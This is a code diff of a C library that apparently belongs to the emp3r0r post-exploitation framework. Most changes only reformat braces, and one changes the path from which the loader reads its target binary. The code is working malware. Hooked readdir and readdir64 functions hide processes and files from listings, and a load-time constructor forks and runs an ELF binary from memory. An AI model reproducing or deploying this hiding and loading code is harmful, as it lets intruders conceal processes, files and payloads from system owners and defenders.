@@ -24,33 +24,40 @@ void trim_str(char *buffer) { buffer[strcspn(buffer, "\r\n")] = 0; }
 // declare sigaction function here to override the one in libc
 // this fixes #244
 int sigaction(int signum, const struct sigaction *act,
-              struct sigaction *oldact) {
+              struct sigaction *oldact)
+{
   static int (*orig_sigaction)(int signum, const struct sigaction *act,
                                struct sigaction *oldact) = NULL;
   if (!orig_sigaction)
     orig_sigaction = dlsym(RTLD_NEXT, "sigaction");
 
-  if (signum == SIGCHLD) {
+  if (signum == SIGCHLD)
+  {
     return 0;
   }
 
   return orig_sigaction(signum, act, oldact);
 }
 
-int is_file_exist(const char *path) {
-  if (access(path, F_OK) != -1) {
+int is_file_exist(const char *path)
+{
+  if (access(path, F_OK) != -1)
+  {
     return 1;
   }
   return 0;
 }
 
-int is_str_in_file(const char *path, const char *str) {
+int is_str_in_file(const char *path, const char *str)
+{
   FILE *fd = fopen(path, "r");
   int bufferLength = 255;
   char buffer[bufferLength];
-  while (fgets(buffer, bufferLength, fd)) {
+  while (fgets(buffer, bufferLength, fd))
+  {
     trim_str(buffer);
-    if (strncmp(str, buffer, strlen(str)) == 0) {
+    if (strncmp(str, buffer, strlen(str)) == 0)
+    {
       fclose(fd);
       return 1;
     }
@@ -63,14 +70,19 @@ int is_str_in_file(const char *path, const char *str) {
 // returns 1 if is PID and hidden
 // returns 2 if is file and hidden
 // returns 0 if not hidden
-int is_hidden(const char *name) {
-  if (is_file_exist(HIDDEN_PIDS)) {
-    if (is_str_in_file(HIDDEN_PIDS, name)) {
+int is_hidden(const char *name)
+{
+  if (is_file_exist(HIDDEN_PIDS))
+  {
+    if (is_str_in_file(HIDDEN_PIDS, name))
+    {
       return 1;
     }
   }
-  if (is_file_exist(HIDDEN_FILES)) {
-    if (is_str_in_file(HIDDEN_FILES, name)) {
+  if (is_file_exist(HIDDEN_FILES))
+  {
+    if (is_str_in_file(HIDDEN_FILES, name))
+    {
       return 2;
     }
   }
@@ -78,16 +90,19 @@ int is_hidden(const char *name) {
 }
 
 // Get a directory name given a DIR* handle
-static int get_dir_name(DIR *dirp, char *dir_name, size_t size) {
+static int get_dir_name(DIR *dirp, char *dir_name, size_t size)
+{
   int fd = dirfd(dirp);
-  if (fd == -1) {
+  if (fd == -1)
+  {
     return 0;
   }
 
   char dir_fd_path[64];
   snprintf(dir_fd_path, sizeof(dir_fd_path), "/proc/self/fd/%d", fd);
   ssize_t ret = readlink(dir_fd_path, dir_name, size);
-  if (ret == -1) {
+  if (ret == -1)
+  {
     return 0;
   }
 
@@ -95,7 +110,8 @@ static int get_dir_name(DIR *dirp, char *dir_name, size_t size) {
   return 1;
 }
 
-DIR *opendir(const char *name) {
+DIR *opendir(const char *name)
+{
   static DIR *(*orig_opendir)(const char *) = NULL;
   if (!orig_opendir)
     orig_opendir = dlsym(RTLD_NEXT, "opendir");
@@ -105,7 +121,8 @@ DIR *opendir(const char *name) {
   return result;
 }
 
-struct dirent64 *readdir64(DIR *dirp) {
+struct dirent64 *readdir64(DIR *dirp)
+{
   static struct dirent64 *(*orig_readdir64)(DIR *dirp) = NULL;
   if (!orig_readdir64)
     orig_readdir64 = dlsym(RTLD_NEXT, "readdir64");
@@ -116,26 +133,32 @@ struct dirent64 *readdir64(DIR *dirp) {
   closedir(proc_1);
 
   result = orig_readdir64(dirp);
-  if (!result) {
+  if (!result)
+  {
     return NULL;
   }
 
   char pwd[1024];
-  if (get_dir_name(dirp, pwd, 1024)) {
+  if (get_dir_name(dirp, pwd, 1024))
+  {
     // processes
-    if (strcmp(pwd, "/proc") == 0) {
-      if (is_hidden(result->d_name) == 1) {
+    if (strcmp(pwd, "/proc") == 0)
+    {
+      if (is_hidden(result->d_name) == 1)
+      {
         return proc1_dir;
       }
     }
 
     // files
-    if (is_hidden(result->d_name) == 2) {
+    if (is_hidden(result->d_name) == 2)
+    {
       return proc1_dir;
     }
 
     // HIDE_ME pattern in filename
-    if (strstr(result->d_name, HIDE_ME)) {
+    if (strstr(result->d_name, HIDE_ME))
+    {
       return proc1_dir;
     }
   }
@@ -143,7 +166,8 @@ struct dirent64 *readdir64(DIR *dirp) {
   return result;
 }
 
-struct dirent *readdir(DIR *dirp) {
+struct dirent *readdir(DIR *dirp)
+{
   static struct dirent *(*orig_readdir)(DIR *dirp) = NULL;
   if (!orig_readdir)
     orig_readdir = dlsym(RTLD_NEXT, "readdir");
@@ -154,26 +178,32 @@ struct dirent *readdir(DIR *dirp) {
   closedir(proc_1);
 
   result = orig_readdir(dirp);
-  if (!result) {
+  if (!result)
+  {
     return NULL;
   }
 
   char pwd[1024];
-  if (get_dir_name(dirp, pwd, 1024)) {
+  if (get_dir_name(dirp, pwd, 1024))
+  {
     // processes
-    if (strcmp(pwd, "/proc") == 0) {
-      if (is_hidden(result->d_name) == 1) {
+    if (strcmp(pwd, "/proc") == 0)
+    {
+      if (is_hidden(result->d_name) == 1)
+      {
         return proc1_dir;
       }
     }
 
     // files
-    if (is_hidden(result->d_name) == 2) {
+    if (is_hidden(result->d_name) == 2)
+    {
       return proc1_dir;
     }
 
     // HIDE_ME pattern in filename
-    if (strstr(result->d_name, HIDE_ME)) {
+    if (strstr(result->d_name, HIDE_ME))
+    {
       return proc1_dir;
     }
   }
@@ -181,7 +211,8 @@ struct dirent *readdir(DIR *dirp) {
   return result;
 }
 
-void __attribute__((constructor)) initLibrary(void) {
+void __attribute__((constructor)) initLibrary(void)
+{
   // ignore SIGCHLD
   signal(SIGCHLD, SIG_IGN);
 
@@ -194,7 +225,8 @@ void __attribute__((constructor)) initLibrary(void) {
   // where to read target ELF file
   // this should be in sync with emp3r0r inject_loader module
   char *exe = calloc(1024, sizeof(char));
-  if (readlink("/proc/self/exe", exe, 1024) < 0) {
+  if (readlink("/proc/self/exe", exe, 1024) < 0)
+  {
     perror("readlink");
     return;
   }
@@ -202,21 +234,18 @@ void __attribute__((constructor)) initLibrary(void) {
   char *elf_path = calloc(1024, sizeof(char)); // path to target ELF file
   const char *cwd = getcwd(NULL, 0);
   // decides where to get target ELF binary
-  if (getuid() == 0) {
-    snprintf(elf_path, 1024, "/usr/share/bash-completion/completions/%s",
-             exe_name);
-  } else {
-    snprintf(elf_path, 1024, "%s/_%s", cwd, exe_name);
-  }
+  snprintf(elf_path, 1024, "%s/_%s", cwd, exe_name);
 
   // check if target ELF file exists, if not, abort
-  if (!is_file_exist(elf_path)) {
+  if (!is_file_exist(elf_path))
+  {
     return;
   }
 
   // read it
   FILE *f = fopen(elf_path, "rb");
-  if (f == NULL) {
+  if (f == NULL)
+  {
     return;
   }
   fseek(f, 0, SEEK_END);
@@ -235,7 +264,8 @@ void __attribute__((constructor)) initLibrary(void) {
 
   pid_t child = fork();
   // in child process
-  if (child == 0) {
+  if (child == 0)
+  {
     // Run the ELF
     elf_run(buf, argv, envv);
   }
